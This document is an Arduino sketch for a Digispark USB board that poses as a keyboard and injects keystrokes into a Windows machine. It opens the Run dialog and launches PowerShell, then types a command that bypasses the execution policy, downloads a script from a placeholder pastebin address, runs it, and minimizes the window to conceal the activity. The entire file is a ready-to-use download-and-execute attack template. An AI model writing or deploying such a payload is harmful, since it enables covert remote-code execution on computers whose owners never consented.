#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {

  pinMode(1, OUTPUT); //LED on Model A 
  
  // Wait for the Windows key to open the Start menu
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200); //use 200 to be safe


  // Type "powershell" and press Enter
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000); //2000

  //Fast script
  DigiKeyboard.println("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass;iwr \"<Your pastebin goes here>\" -OutFile f.ps1;.\\f.ps1;exit");

  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Minimize
  DigiKeyboard.sendKeyStroke(KEY_N);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}

void loop() {
  // Do nothing in the loop
}
